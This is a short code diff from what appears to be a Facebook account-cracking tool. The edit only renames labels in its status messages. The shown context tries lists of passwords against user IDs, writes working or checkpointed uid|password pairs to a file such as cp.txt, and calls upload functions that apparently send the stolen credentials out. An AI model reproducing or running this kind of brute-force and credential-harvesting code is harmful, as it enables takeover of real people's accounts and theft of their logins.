@@ -801,7 +801,7 @@ MATLABI DUNIYA MATLABI LOG💔💔💔💔💔💔💔
 		])
 		
 		sys.stdout.write(
-			"\r\r %s[>_] [HANI_OLD] : %s/%s -> \033[0;92m [ HANI-OK:%s ]- \033[0;91m[HANI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [HANI-OLD] : %s/%s -> \033[0;92m [ HANI-OK:%s ]- \033[0;91m[HANI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -824,9 +824,9 @@ MATLABI DUNIYA MATLABI LOG💔💔💔💔💔💔💔
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[HANI-AL-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[HANI-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [HANI-AL-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [HANI-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
